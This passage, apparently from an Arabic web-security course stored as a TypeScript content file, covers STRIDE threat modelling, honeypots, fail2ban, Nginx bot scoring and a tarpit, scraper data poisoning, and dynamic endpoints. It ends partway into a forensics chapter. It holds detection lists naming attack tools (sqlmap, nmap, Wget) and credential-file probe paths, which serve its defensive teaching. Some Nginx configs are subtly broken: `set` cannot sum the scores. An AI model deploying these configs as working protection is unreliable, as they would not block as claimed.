import { Part, ContentType } from '../../types';

export const part9Content: Part = {
  id: "p9",
  partTitle: "الباب التاسع: العمليات المظلمة والدفاع الاستباقي",
  icon: "☠️",
  chapters: [
     {
        id: "p9_c1", chapterTitle: "الفصل الأول: نمذجة التهديدات والدفاع النشط",
        sections: [
            {
              id: "p9_c1_s1",
              icon: "🗺️",
              title: "المستوى 200: مقدمة إلى نمذجة التهديدات وإطار STRIDE",
              content: [
                { type: ContentType.PARAGRAPH, text: "حتى الآن، كان نهجنا للأمان دفاعيًا بشكل سلبي: نبني جدارًا، ونحصن الأبواب، ونراقب النشاط. هذا ضروري، لكنه تفاعلي. نمذجة التهديدات تقلب المعادلة. إنها عملية منظمة للتفكير في نظامك من وجهة نظر المهاجم، لتحديد نقاط الضعف المحتملة وتصميم الدفاعات *قبل* كتابة سطر واحد من الكود." },
                { type: ContentType.PARAGRAPH, text: "STRIDE هو إطار عمل شائع تم تطويره بواسطة Microsoft لمساعدة المهندسين على التفكير بشكل منهجي في أنواع التهديدات. إنه اختصار لست فئات من التهديدات. بدلاً من مجرد التفكير في 'الأمان' كمفهوم غامض، يمنحك STRIDE عدسة محددة للنظر من خلالها إلى كل مكون من مكونات نظامك." },
                { type: ContentType.DEFINITION_LIST, definitionItems: [
                    { term: "Spoofing (الانتحال)", definition: "التظاهر بأنه شخص أو شيء آخر. **السؤال الأمني:** كيف أعرف أن هذا المستخدم هو من يدعي أنه هو؟ **مثال:** مستخدم ينتحل شخصية مسؤول عن طريق سرقة ملفات تعريف الارتباط الخاصة به." },
                    { term: "Tampering (العبث)", definition: "تعديل البيانات بشكل غير مصرح به. **السؤال الأمني:** كيف يمكنني التأكد من أن هذه البيانات لم يتم العبث بها؟ **مثال:** تغيير سعر منتج في عربة التسوق عن طريق اعتراض الطلب." },
                    { term: "Repudiation (التنصل)", definition: "إنكار القيام بفعل ما. **السؤال الأمني:** كيف يمكنني إثبات أن هذا المستخدم قام بهذا الإجراء؟ **مثال:** مستخدم ينكر أنه أجرى معاملة مالية. **الدفاع:** سجلات تدقيق مفصلة وغير قابلة للتغيير." },
                    { term: "Information Disclosure (الكشف عن المعلومات)", definition: "كشف معلومات حساسة لأشخاص غير مصرح لهم. **السؤال الأمني:** كيف يمكنني منع الآخرين من قراءة بياناتي الخاصة؟ **مثال:** تسرب بيانات المستخدمين بسبب استعلام قاعدة بيانات غير آمن." },
                    { term: "Denial of Service (حجب الخدمة)", definition: "جعل النظام غير متاح للمستخدمين الشرعيين. **السؤال الأمني:** كيف يمكنني التأكد من أن خدمتي لا تزال متاحة؟ **مثال:** إغراق الخادم بالطلبات." },
                    { term: "Elevation of Privilege (تصعيد الامتيازات)", definition: "الحصول على وصول يتجاوز ما هو مسموح به. **السؤال الأمني:** كيف أمنع المستخدم من القيام بأشياء لا يفترض به القيام بها؟ **مثال:** مستخدم عادي يكتشف ثغرة تمنحه وصولاً إداريًا." }
                ]},
              ]
            },
            {
              id: "p9_c1_s2",
              icon: "✍️",
              title: "المستوى 201: دراسة حالة: نمذجة تهديد لصفحة تحديث الملف الشخصي",
              content: [
                { type: ContentType.PARAGRAPH, text: "لنجعل الأمر عمليًا. لنقم بنمذجة تهديد لميزة أكثر تعقيدًا: صفحة تحديث الملف الشخصي التي تسمح للمستخدم بتغيير بريده الإلكتروني وتحميل صورة ملف شخصي جديدة. هذا يلمس العديد من أجزاء نظامنا." },
                { type: ContentType.HEADING4, text: "1. رسم مخطط تدفق البيانات (DFD)" },
                { type: ContentType.PARAGRAPH, text: "أولاً، نرسم كيف تتدفق البيانات عبر النظام:" },
                { type: ContentType.IMAGE_PLACEHOLDER, alt: "مخطط تدفق بيانات مفصل لعملية تحديث الملف الشخصي مع رفع صورة", width: 800, height: 450 },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>الكيان الخارجي:</strong> المستخدم",
                    "<strong>العملية 1:</strong> المتصفح يعرض نموذج تحديث الملف الشخصي.",
                    "<strong>العملية 2:</strong> الخادم (Nginx + Express.js) يتحقق من صحة الطلب.",
                    "<strong>العملية 3:</strong> الخادم يعالج الصورة (يغير حجمها، يحسنها).",
                    "<strong>العملية 4:</strong> الخادم يحدث سجل المستخدم في قاعدة البيانات.",
                    "<strong>مخزن البيانات 1:</strong> قاعدة بيانات PostgreSQL (تخزن البريد الإلكتروني، مسار الصورة).",
                    "<strong>مخزن البيانات 2:</strong> نظام الملفات أو S3 (يخزن ملف الصورة).",
                    "<strong>حدود الثقة:</strong> الخطوط الحمراء المنقطة التي تفصل بين المكونات التي لا تثق ببعضها البعض (على سبيل المثال, الإنترنت مقابل خادمنا)."
                ]},
                { type: ContentType.HEADING4, text: "2. تطبيق STRIDE على كل مكون" },
                { type: ContentType.PARAGRAPH, text: "الآن، نسير عبر المخطط ونطرح أسئلة STRIDE:" },
                 { type: ContentType.DEFINITION_LIST, definitionItems: [
                    { term: "تدفق البيانات (من المتصفح إلى الخادم)", definition: "<strong>T:</strong> هل يمكن للمهاجم العبث بالبريد الإلكتروني أثناء النقل؟ *الدفاع: فرض HTTPS.* <strong>I:</strong> هل يمكن للمهاجم اعتراض الجلسة؟ *الدفاع: ترويسة HSTS، ملفات تعريف ارتباط آمنة.*" },
                    { term: "العملية 2 (التحقق من الصحة)", definition: "<strong>S:</strong> هل يمكن للمستخدم تحديث ملف شخصي لمستخدم آخر؟ *التهديد: التحكم في الوصول المعطل.* *الدفاع: تحقق دائمًا من أن `userID` في الجلسة يطابق `userID` الذي يتم تحديثه.* <strong>D:</strong> هل يمكن للمهاجم إغراق هذه النقطة بطلبات تحديث؟ *الدفاع: الحد من المعدل.*" },
                    { term: "العملية 3 (معالجة الصور)", definition: "<strong>D:</strong> هل يمكن للمهاجم تحميل 'قنبلة ضغط' (ملف صغير يتم فك ضغطه إلى حجم هائل) لإرهاق وحدة المعالجة المركزية/الذاكرة؟ *الدفاع: تحقق من أبعاد الصورة وحجمها *قبل* معالجتها. استخدم مكتبة معالجة صور محصنة.* <strong>E:</strong> هل يمكن لثغرة أمنية في مكتبة معالجة الصور أن تسمح بتنفيذ تعليمات برمجية عن بعد؟ *الدفاع: قم بتشغيل عملية المعالجة في حاوية معزولة وبأقل الامتيازات. حافظ على تحديث المكتبات.*" },
                    { term: "مخزن البيانات 2 (تخزين الملفات)", definition: "<strong>I:</strong> هل يمكن للمستخدم تحميل ملف PHP بدلاً من صورة، ثم خداع الخادم لتنفيذه؟ *التهديد: تحميل ملف غير مقيد.* *الدفاع: تحقق من امتداد الملف ونوع MIME. لا تقم أبدًا بخدمة الملفات التي تم تحميلها من نفس نطاق تطبيقك. استخدم نطاقًا منفصلاً أو CDN.*" }
                ]},
              ]
            },
            {
              id: "p9_c1_s3",
              icon: "🛡️",
              title: "المستوى 202: فلسفة الدفاع النشط وهرم الألم",
              content: [
                { type: ContentType.PARAGRAPH, text: "يمثل الدفاع السلبي كل ما قمنا به حتى الآن: بناء جدران أعلى وأقوى. إنه فعال ولكنه ثابت. المهاجم هو الذي يختار وقت ومكان الهجوم، ونحن نأمل أن تصمد دفاعاتنا." },
                { type: ContentType.PARAGRAPH, text: "الدفاع النشط يغير الديناميكية. بدلاً من مجرد الصد، فإننا نرد. الهدف ليس 'اختراق المهاجمين' (وهو أمر غير قانوني)، بل جعل بيئتنا معادية وصعبة ومكلفة للمهاجم. نحن نضع أفخاخًا، وننشر معلومات مضللة، ونهدر وقت وموارد المهاجم." },
                { type: ContentType.HEADING4, text: "هرم الألم (Pyramid of Pain)" },
                { type: ContentType.PARAGRAPH, text: "هرم الألم هو إطار عمل يوضح مدى صعوبة تغيير المهاجم لمؤشرات الاختراق (IOCs) الخاصة به. الهدف من الدفاع النشط هو العمل في أعلى مستويات الهرم قدر الإمكان:" },
                { type: ContentType.IMAGE_PLACEHOLDER, alt: "مخطط هرم الألم في الأمن السيبراني", width: 600, height: 500 },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>سهل (قاعدة الهرم):</strong> قيم التجزئة (Hash Values)، عناوين IP. من السهل جدًا على المهاجم تغييرها.",
                    "<strong>مزعج:</strong> أسماء النطاقات. يتطلب المزيد من الجهد لتسجيل نطاقات جديدة.",
                    "<strong>صعب:</strong> أدوات الشبكة/المضيف. يتطلب من المهاجم إعادة كتابة أدواته أو العثور على أدوات جديدة.",
                    "<strong>صعب جدًا (قمة الهرم):</strong> التكتيكات والتقنيات والإجراءات (TTPs). هذا هو سلوك المهاجم. إذا تمكنت من اكتشاف *كيفية* عمل المهاجم وإجباره على تغيير سلوكه الأساسي، فقد جعلت حياته صعبة للغاية. الدفاع النشط والخداع يهدفان إلى هذا المستوى."
                ]},
              ]
            },
            {
              id: "p9_c1_s4",
              icon: "🍯",
              title: "المستوى 203: تقنيات الخداع: أنواع Honeypots",
              content: [
                { type: ContentType.PARAGRAPH, text: "وعاء العسل (Honeypot) هو أداة خداع أمنية. إنه نظام أو خدمة مصممة لتقليد هدف محتمل للهجوم، ولكنها في الواقع فخ معزول ومراقب. يتم تصميمه ليبدو ضعيفًا وجذابًا للمهاجمين." },
                { type: ContentType.PARAGRAPH, text: "الفائدة الرئيسية لوعاء العسل هي أن **أي حركة مرور إليه هي، بحكم التعريف، مشبوهة**. لا يوجد سبب لمستخدم شرعي للتفاعل معه. هذا يجعله نظام إنذار مبكر عالي الدقة. عندما يلمس شخص ما وعاء العسل، فأنت تعلم أن لديك زائرًا غير مرغوب فيه." },
                { type: ContentType.HEADING4, text: "أنواع Honeypots" },
                { type: ContentType.DEFINITION_LIST, definitionItems: [
                    { term: "منخفض التفاعل (Low-Interaction)", definition: "هذه هي أبسط أنواع أوعية العسل. إنها تحاكي الخدمات ولكنها لا تنفذها بالكامل. `endlessh` هو مثال مثالي. إنها سهلة الإعداد وآمنة نسبيًا، لكن المهاجمين المهرة قد يكتشفون أنها ليست حقيقية." },
                    { term: "متوسط التفاعل (Medium-Interaction)", definition: "توفر هذه المزيد من الوظائف لتبدو أكثر واقعية. على سبيل المثال، قد يحاكي وعاء عسل SSH أوامر `ls` و `pwd` ولكن ليس الأوامر الأكثر تعقيدًا." },
                    { term: "عالي التفاعل (High-Interaction)", definition: "هذه هي أنظمة تشغيل حقيقية وكاملة مصممة ليتم اختراقها. إنها توفر أغنى المعلومات الاستخباراتية حول أدوات المهاجمين وتكتيكاتهم، ولكنها أيضًا الأكثر خطورة في التشغيل. يجب أن تكون معزولة تمامًا عن شبكة الإنتاج الخاصة بك." }
                ]},
              ]
            },
            {
              id: "p9_c1_s5",
              icon: "🐝",
              title: "المستوى 204: دراسة حالة: إنشاء فخ SSH آلي مع Fail2Ban",
              content: [
                { type: ContentType.PARAGRAPH, text: "لقد قمنا بإعداد `endlessh` كوعاء عسل منخفض التفاعل. الآن، لنجعله دفاعًا نشطًا. سنقوم بتكوين `fail2ban` لمراقبة سجلات `endlessh` وحظر أي عنوان IP يتفاعل معه على الفور. هذا ينشئ نظام فخ وحظر آلي." },
                { type: ContentType.HEADING4, text: "الخطوة 1: إنشاء مرشح `fail2ban` لـ `endlessh`" },
                { type: ContentType.CODE_BLOCK, language: "bash", code: "sudo nano /etc/fail2ban/filter.d/endlessh.conf" },
                { type: ContentType.CODE_EXPLANATION, language: "ini", codeTitle: "/etc/fail2ban/filter.d/endlessh.conf", code: `[Definition]
failregex = ^endlessh\\[\\d+\\]: \\(- \\<HOST\\> \\d+\\): new connection$
ignoreregex =`, explanations: [
                    { lines: "2", explanation: "هذا هو التعبير النمطي (regex) الذي سيبحث عنه `fail2ban`. إنه مصمم لمطابقة سطر السجل الذي ينشئه `endlessh` عند قبول اتصال جديد. `<HOST>` هو عنصر نائب خاص بـ `fail2ban` يلتقط عنوان IP." }
                ]},
                { type: ContentType.HEADING4, text: "الخطوة 2: إنشاء سجن `endlessh`" },
                { type: ContentType.CODE_BLOCK, language: "bash", code: "sudo nano /etc/fail2ban/jail.d/endlessh.local" },
                { type: ContentType.CODE_EXPLANATION, language: "ini", codeTitle: "/etc/fail2ban/jail.d/endlessh.local", code: `[endlessh]
enabled  = true
port     = 2222 # The port your endlessh is running on
filter   = endlessh
logpath  = /var/log/syslog  # Or wherever endlessh logs to, check with journalctl
maxretry = 1
bantime  = 1w
findtime = 1m`, explanations: [
                    { lines: "6", explanation: "`maxretry = 1`: نحن متسامحون للغاية. محاولة واحدة للاتصال بوعاء العسل كافية للحظر." },
                    { lines: "7", explanation: "`bantime = 1w`: نقوم بحظرهم لمدة أسبوع. هذا يزيلهم من مجموعة المهاجمين لفترة طويلة." }
                ]},
                { type: ContentType.PARAGRAPH, text: "أعد تشغيل `fail2ban` (`sudo systemctl restart fail2ban`). الآن، أي شخص يحاول الاتصال بالمنفذ 2222 سيتم أسره بواسطة `endlessh` وفي نفس الوقت يتم حظره على مستوى جدار الحماية بواسطة `fail2ban` من محاولة أي شيء آخر. لقد انتقلت من الدفاع السلبي إلى نصب فخ نشط." },
              ]
            }
        ]
    },
     {
        id: "p9_c2", chapterTitle: "الفصل الثاني: تقنيات الخداع المتقدمة",
        sections: [
            {
              id: "p9_c2_s1",
              icon: " decoy",
              title: "المستوى 205: دراسة حالة: بناء API Honeypot في Express.js",
              content: [
                { type: ContentType.PARAGRAPH, text: "يمكننا تطبيق نفس مبدأ الخداع على تطبيق الويب الخاص بنا. سنقوم بإنشاء نقاط نهاية API تبدو جذابة للمهاجمين الذين يبحثون عن نقاط ضعف شائعة. هذا المثال لا يقوم فقط بتسجيل الهجوم، بل يضيف المهاجم إلى قائمة حظر ديناميكية ويقدم بيانات مزيفة لتسميم جهود جمع البيانات الخاصة به." },
                { type: ContentType.CODE_BLOCK, language: "javascript", codeTitle: "مثال متقدم في Express.js", code: `const { exec } = require('child_process');

// استخدم ipset لإدارة قائمة حظر ديناميكية
// sudo ipset create honeypot_blocklist hash:ip timeout 3600
const blockIp = (ip) => {
  // Ensure the IP is sanitized to prevent command injection
  const sanitizedIp = ip.replace(/[^0-9.]/g, ''); 
  exec(\`sudo ipset add honeypot_blocklist \${sanitizedIp}\`, (err) => {
    if (err) console.error('Failed to block IP:', err);
  });
};

const honeypotPaths = ['/.env', '/wp-admin.php', '/config.json.bkp', '/.git/config'];

app.use(honeypotPaths, (req, res) => {
  const ip = req.ip;
  console.warn(\`HONEYPOT TRIGGERED: IP=\${ip}, Path=\${req.path}\`);
  blockIp(ip); // أضف المهاجم إلى قائمة الحظر

  // قم بتسميم البيانات. إذا طلبوا .env، أرسل لهم بيانات مزيفة.
  if (req.path === '/.env') {
    return res.type('text/plain').send('DB_HOST=localhost\\nDB_USER=root\\nDB_PASS=12345678');
  }
  
  res.status(404).send('Not Found');
});` },
                { type: ContentType.PARAGRAPH, text: "ستحتاج إلى قاعدة `iptables` لاستخدام هذه القائمة: `sudo iptables -I INPUT -m set --match-set honeypot_blocklist src -j DROP`. الآن، أي شخص يصل إلى أحد مسارات وعاء العسل سيتم حظره على مستوى جدار الحماية لمدة ساعة." },
              ]
            },
            {
              id: "p9_c2_s2",
              icon: "👆",
              title: "المستوى 206: بصمات الخادم وتحديات Nginx",
              content: [
                { type: ContentType.PARAGRAPH, text: "غالبًا ما تكشف الروبوتات عن نفسها من خلال ترويسات HTTP التي ترسلها. يمكننا استخدام Nginx لتحليل هذه الترويسات، وإعطاء 'درجة شبهة' لكل طلب، وحظر الطلبات التي تتجاوز حدًا معينًا." },
                { type: ContentType.CODE_EXPLANATION, language: "nginx", codeTitle: "تكوين Nginx لمكافحة الروبوتات", code: `map $http_user_agent $bad_bot_score {
    default 0;
    "~*Wget" 1;
    "~*sqlmap" 2;
    "~*nmap" 2;
}

map $http_accept $bad_accept_score {
    default 0;
    "" 1; # وكيل قبول فارغ أمر مشبوه
}

server {
    # ...
    set $suspicion_score 0;
    if ($bad_bot_score > 0) {
        set $suspicion_score ($suspicion_score + $bad_bot_score);
    }
     if ($bad_accept_score > 0) {
        set $suspicion_score ($suspicion_score + $bad_accept_score);
    }
    
    if ($suspicion_score > 1) {
        return 403; # أو 444 لقطع الاتصال بصمت
    }
    # ...
}`, explanations: [
                    { lines: "1-6", explanation: "نستخدم كتلة `map` لتقييم وكيل المستخدم. إذا كان يحتوي على سلاسل مرتبطة بأدوات القرصنة، فإننا نعطي درجة `bad_bot_score`." },
                    { lines: "8-12", explanation: "نقوم بنفس الشيء لترويسة `Accept`. غالبًا ما ترسل الروبوتات السيئة ترويسات فارغة." },
                    { lines: "15-22", explanation: "نجمع الدرجات معًا. (ملاحظة: يتطلب Nginx استخدام `if`s متداخلة لتجميع الدرجات)." },
                    { lines: "24-26", explanation: "إذا كانت الدرجة الإجمالية عالية جدًا، فإننا نرفض الطلب." }
                ]},
              ]
            },
            {
              id: "p9_c2_s3",
              icon: " maze",
              title: "المستوى 207: تنفيذ مصيدة (Tarpit) في Nginx",
              content: [
                { type: ContentType.PARAGRAPH, text: "المصيدة هي تقنية دفاع نشط تبقي المهاجم متصلاً ولكنها تبطئ الاستجابة إلى حد كبير، مما يهدر وقته وموارده. يمكننا إنشاء مصيدة في Nginx للروبوتات التي تم تحديدها." },
                { type: ContentType.CODE_BLOCK, language: "nginx", codeTitle: "Nginx Tarpit", code: `limit_conn_zone $binary_remote_addr zone=tarpit:10m;

server {
    # ...
    # (Include the suspicion score logic from the previous level)
    # ...

    location / {
        if ($suspicion_score > 1) {
            # إعادة كتابة إلى موقع مصيدة
            rewrite ^ /tarpit_connection last;
        }
        # ... normal processing ...
    }

    location = /tarpit_connection {
        internal;
        limit_conn tarpit 1;
        limit_rate 10; # أبطئ الاستجابة إلى 10 بايت في الثانية
        return 200 "OK"; # ابدأ في إرسال استجابة بطيئة
    }
}` },
                { type: ContentType.PARAGRAPH, text: "هذا التكوين يوجه الطلبات المشبوهة إلى موقع خاص يحد من الاتصال إلى واحد ويقيد سرعة النقل إلى سرعة بطيئة للغاية. سيبقى الروبوت عالقًا في انتظار اكتمال الاستجابة." },
              ]
            },
            {
              id: "p9_c2_s4",
              icon: " poisoning",
              title: "المستوى 208: دراسة حالة: تسميم البيانات لكاشطات الويب",
              content: [
                { type: ContentType.PARAGRAPH, text: "لنفترض أنك تدير موقعًا للتجارة الإلكترونية والمنافسون يقومون بكشط أسعار منتجاتك. يمكنك محاربة هذا عن طريق تسميم بياناتهم. الفكرة هي تحديد الكاشطات (على سبيل المثال، عدد كبير جدًا من الطلبات من نفس IP) وخدمة بيانات مزيفة لهم." },
                { type: ContentType.CODE_BLOCK, language: "javascript", codeTitle: "Express.js Middleware لتسميم البيانات", code: `const suspiciousIps = new Set(); // Manage this set, maybe from fail2ban or honeypot logs

function dataPoisoningMiddleware(req, res, next) {
  if (suspiciousIps.has(req.ip)) {
    // إنه كاشط! قم بإنشاء بيانات منتج مزيفة.
    const fakeProduct = {
      id: req.params.id,
      name: "Super Amazing Product",
      price: (Math.random() * 10).toFixed(2), // سعر منخفض بشكل جذاب ومزيف
      in_stock: true
    };
    return res.json(fakeProduct);
  }
  next();
}

app.get('/api/products/:id', dataPoisoningMiddleware, getRealProduct);` },
                { type: ContentType.PARAGRAPH, text: "هذا يجعل البيانات التي يجمعها المنافس عديمة الفائدة تمامًا، حيث ستكون مليئة بالأسعار الخاطئة. إنها طريقة أكثر ذكاءً من مجرد حظرهم." },
              ]
            },
            {
              id: "p9_c2_s5",
              icon: "📊",
              title: "المستوى 209: دراسة حالة: تصور بيانات الهجوم",
              content: [
                { type: ContentType.PARAGRAPH, text: "جمع البيانات من أوعية العسل الخاصة بك لا يكفي؛ تحتاج إلى تصورها. لنجعل هذا عمليًا. لنفترض أن وعاء العسل الخاص بـ API يكتب سجلات بتنسيق JSON إلى `/var/log/honeypot.log`:" },
                { type: ContentType.PREFORMATTED_TEXT, text: `{ "timestamp": "...", "ip": "1.2.3.4", "path": "/.env", "user_agent": "..." }` },
                { type: ContentType.HEADING4, text: "خط أنابيب Logstash" },
                { type: ContentType.PARAGRAPH, text: "يمكننا استخدام Logstash لقراءة هذا الملف، وتحليل عنوان IP لتحديد موقعه الجغرافي، وإرساله إلى Elasticsearch." },
                { type: ContentType.CODE_BLOCK, language: "ruby", codeTitle: "logstash.conf", code: `input {
  file {
    path => "/var/log/honeypot.log"
    codec => "json"
  }
}
filter {
  geoip {
    source => "ip"
  }
}
output {
  elasticsearch { hosts => ["localhost:9200"] }
}` },
                { type: ContentType.PARAGRAPH, text: "الآن في Kibana، يمكنك إنشاء لوحة معلومات تعرض خريطة للعالم تظهر من أين تأتي الهجمات، ورسمًا بيانيًا دائريًا يوضح المسارات الأكثر استهدافًا، وقائمة بأفضل وكلاء المستخدم المهاجمين. لقد حولت الهجمات إلى معلومات استخباراتية قابلة للتنفيذ." },
              ]
            }
        ]
    },
     {
        id: "p9_c3", chapterTitle: "الفصل الثالث: عمليات BlackMetaOps",
        sections: [
            {
              id: "p9_c3_s1",
              icon: "🧬",
              title: "المستوى 210: دراسة حالة: تنفيذ نقاط نهاية متحورة مع Redis",
              content: [
                { type: ContentType.PARAGRAPH, text: "تعتمد الهجمات الآلية على الأهداف الثابتة. BlackMetaOps هو مفهوم متقدم حيث نجعل سطح الهجوم لدينا هدفًا متحركًا. لنبني مثالاً ملموسًا باستخدام Node.js و Redis." },
                { type: ContentType.HEADING4, text: "سير العمل:" },
                { type: ContentType.CODE_BLOCK, language: "javascript", codeTitle: "Express.js + Redis", code: `const { v4: uuidv4 } = require('uuid');
const redis = require('redis').createClient();
await redis.connect();

// 1. عند تسجيل الدخول بنجاح، قم بإنشاء خريطة مسار
app.post('/api/login', async (req, res) => {
  // ... (validate user) ...
  const sessionId = uuidv4();
  const paths = {
    getUserProfile: \`/api/p/\${uuidv4()}\`,
    updateUserProfile: \`/api/p/\${uuidv4()}\`
  };
  
  // قم بتخزين المسارات في Redis مع انتهاء صلاحية الجلسة
  await redis.set(\`session:\${sessionId}:paths\`, JSON.stringify(paths), { EX: 3600 });
  
  res.cookie('session_id', sessionId).json({ paths });
});

// 2. Middleware للتحقق من المسارات الديناميكية
async function dynamicPathAuth(req, res, next) {
  const { sessionId } = req.cookies;
  if (!sessionId) return res.sendStatus(401);
  const pathMapStr = await redis.get(\`session:\${sessionId}:paths\`);
  if (!pathMapStr) return res.sendStatus(401);

  const pathMap = JSON.parse(pathMapStr);
  
  // تحقق مما إذا كان المسار المطلوب صالحًا لهذه الجلسة
  if (!Object.values(pathMap).includes(req.originalUrl)) {
    return res.status(404).send('Not Found');
  }
  next();
}

app.get('/api/p/:dynamicPath', dynamicPathAuth, (req, res) => { /* ... serve profile data ... */ });
`},
                { type: ContentType.PARAGRAPH, text: "هذا النظام يجعل من المستحيل على المهاجم اكتشاف نقاط نهاية API الخاصة بك عن طريق التخمين. يجب على كل عميل مصادق عليه أولاً للحصول على خريطة المسار الديناميكية الحالية." },
              ]
            },
            {
              id: "p9_c3_s2",
              icon: "📲",
              title: "المستوى 211: دراسة حالة: عميل React ديناميكي",
              content: [
                { type: ContentType.PARAGRAPH, text: "لجعل هذا يعمل، يجب ألا يحتوي كود الواجهة الأمامية الخاص بك على أي مسارات API مكتوبة بشكل ثابت. يجب أن يتم بناؤه ليكون قابلاً للتكوين بالكامل من قبل الخادم." },
                { type: ContentType.CODE_BLOCK, language: "javascript", codeTitle: "مثال في React", code: `// api.js - a simple API wrapper
let API_PATHS = {};

export async function initializeApi(credentials) {
  // After login, the server returns the path map
  const response = await fetch('/api/login', { method: 'POST', body: JSON.stringify(credentials) });
  const data = await response.json();
  API_PATHS = data.paths;
  return true; // or handle errors
}

export function get(endpointName, params) {
  const path = API_PATHS[endpointName]; // e.g., 'getUserProfile'
  if (!path) throw new Error(\`Unknown API endpoint: \${endpointName}\`);
  return fetch(path);
}

// component.js
import { get, initializeApi } from './api';

function UserProfile() {
  const [data, setData] = useState(null);
  useEffect(() => {
    // Fetch the dynamic user profile data
    get('getUserProfile').then(res => res.json()).then(setData);
  }, []);
  // ...
}` },
              ]
            },
            {
              id: "p9_c3_s3",
              icon: "🔑",
              title: "المستوى 212: دراسة حالة: تنفيذ رموز النية (Intent Tokens)",
              content: [
                { type: ContentType.PARAGRAPH, text: "يمكننا أن نذهب خطوة أبعد. لكل طلب يتطلب إجراءً حساسًا (مثل تحويل الأموال)، يمكن أن يطلب العميل أولاً 'رمز نية' (intent token) من الخادم. ثم يجب عليه إدراج هذا الرمز المميز لمرة واحدة في عنوان URL للطلب الفعلي. هذا يجعل هجمات CSRF وإعادة تشغيل الطلبات (replay attacks) مستحيلة تقريبًا." },
                { type: ContentType.CODE_BLOCK, language: "javascript", codeTitle: "Express Middleware لرموز النية", code: `// 1. إنشاء نية
app.post('/api/create-transfer-intent', async (req, res) => {
  const intentToken = uuidv4();
  // قم بتخزين النية في Redis مع تفاصيلها، صالحة لمدة 60 ثانية
  await redis.set(\`intent:\${intentToken}\`, JSON.stringify(req.body), { EX: 60 });
  res.json({ intentToken });
});

// 2. تنفيذ النية
app.post('/api/execute-transfer/:intentToken', async (req, res) => {
  const intentData = await redis.get(\`intent:\${req.params.intentToken}\`);
  if (!intentData) {
    return res.status(400).send('Invalid or expired token.');
  }
  
  // قم بإزالة الرمز المميز لمنع إعادة الاستخدام
  await redis.del(\`intent:\${req.params.intentToken}\`);
  
  // ... (قم بتنفيذ التحويل باستخدام intentData) ...
});` },
              ]
            },
            {
              id: "p9_c3_s4",
              icon: "🔀",
              title: "المستوى 213: دراسة حالة: توجيه الخداع في Nginx",
              content: [
                { type: ContentType.PARAGRAPH, text: "يمكننا ربط كل هذا معًا. باستخدام أدوات مثل Nginx مع منطق Lua المخصص أو متغيرات `map`، يمكننا إنشاء نظام توجيه ذكي. الفكرة هي تحديد الطلبات المشبوهة على الحافة (edge) وتوجيهها بشفافية إلى بنية تحتية خادعة." },
                { type: ContentType.CODE_EXPLANATION, language: "nginx", codeTitle: "تكوين Nginx للتوجيه الديناميكي", code: `upstream production_backend {
  server 127.0.0.1:3000;
}
upstream honeypot_backend {
  server 127.0.0.1:9999; # A separate honeypot process
}

# Use the geo module to create a blocklist based on IP
geo $is_bad_actor {
    default 0;
    1.2.3.4 1; # An IP from our Fail2Ban/honeypot logs
    # ... more IPs ...
}

server {
    # ...
    set $backend_server "production_backend";
    if ($is_bad_actor) {
        set $backend_server "honeypot_backend";
    }
    
    location / {
        proxy_pass http://$backend_server;
        # ...
    }
}`, explanations: [
                    { lines: "1-6", explanation: "نحدد خادمي خلفية مختلفين: واحد للإنتاج الحقيقي، والآخر لوعاء العسل." },
                    { lines: "9-14", explanation: "نستخدم وحدة `geo` لإنشاء متغير `$is_bad_actor` سيكون `1` إذا تطابق IP العميل مع قائمة الحظر الخاصة بنا." },
                    { lines: "18-24", explanation: "داخل كتلة الخادم، نستخدم `if` لتغيير وجهة `proxy_pass` ديناميكيًا. يتم إرسال المستخدمين الشرعيين إلى الإنتاج، والمهاجمين المعروفين إلى وعاء العسل، كل ذلك بشفافية تامة." }
                ]},
              ]
            },
            {
              id: "p9_c3_s5",
              icon: "⚖️",
              title: "المستوى 214: الأخلاقيات والاعتبارات القانونية",
              content: [
                { type: ContentType.PARAGRAPH, text: "من الأهمية بمكان فهم الخط الفاصل بين الدفاع النشط والهجوم. كل التقنيات التي تمت مناقشتها تحدث **داخل** بنيتك التحتية. أنت تخدع المهاجمين الذين يهاجمونك بالفعل." },
                { type: ContentType.HEADING4, text: "ما لا يجب فعله أبدًا (غير قانوني وغير أخلاقي):" },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>'الاختراق الراجع' (Hacking Back):</strong> لا تحاول أبدًا شن هجوم على نظام المهاجم. هذا غير قانوني في كل مكان تقريبًا.",
                    "<strong>جمع المعلومات الشخصية:</strong> لا تحاول جمع أي معلومات تعريف شخصية من المهاجمين. ركز على TTPs (التكتيكات والتقنيات والإجراءات).",
                    "<strong>نشر البرامج الضارة:</strong> لا تحاول خداع المهاجم لتنزيل برامج ضارة.",
                    "<strong>الانخراط في الانتحال:</strong> لا تنتحل شخصية جهات إنفاذ القانون أو كيانات أخرى."
                ]},
                { type: ContentType.NOTE, title: "الإطار القانوني", text: "تختلف القوانين بشكل كبير حسب الولاية القضائية. قوانين مثل قانون الاحتيال وإساءة استخدام الكمبيوتر (CFAA) في الولايات المتحدة صارمة للغاية. قبل تنفيذ أي استراتيجيات دفاع نشط عدوانية في بيئة شركة، من الضروري للغاية استشارة المستشار القانوني وفريق أمن المعلومات لضمان أن أفعالك تقع ضمن الحدود القانونية وسياسة الشركة. الهدف هو دائمًا الدفاع، وليس الهجوم." },
              ]
            }
        ]
    },
     {
        id: "p9_c4", chapterTitle: "الفصل الرابع: التحليل الجنائي والاستجابة",
        sections: [
            {
              id: "p9_c4_s1",
              icon: "🔬",
              title: "المستوى 215: أساسيات التحليل الجنائي الرقمي ومبدأ التقلب",
              content: [
                { type: ContentType.PARAGRAPH, text: "التحليل الجنائي الرقمي هو فن وعلم استعادة وتحليل البيانات من الأنظمة الرقمية للتحقيق في حادث أمني. عندما يحدث اختراق، فإن الهدف هو فهم ما حدث، وكيف حدث، وما هو التأثير، كل ذلك مع الحفاظ على سلامة الأدلة." },
                { type: ContentType.HEADING4, text: "مبدأ التقلب (Volatility)" },
                { type: ContentType.PARAGRAPH, text: "هذا هو المبدأ التوجيهي الأساسي لجمع الأدلة. يجب عليك جمع البيانات بدءًا من الأكثر تقلبًا (الأكثر احتمالاً للتغيير أو الاختفاء) إلى الأقل تقلبًا." },
                { type: ContentType.LIST_UNORDERED, items: [
                    "<strong>1. الذاكرة العشوائية (RAM):</strong> الأكثر تقلبًا. تختفي عند إيقاف التشغيل.",
                    "<strong>2. حالة الشبكة والعمليات:</strong> تتغير باستمرار.",
                    "<strong>3. بيانات نظام الملفات:</strong> أقل تقلبًا، ولكن يمكن تعديلها.",
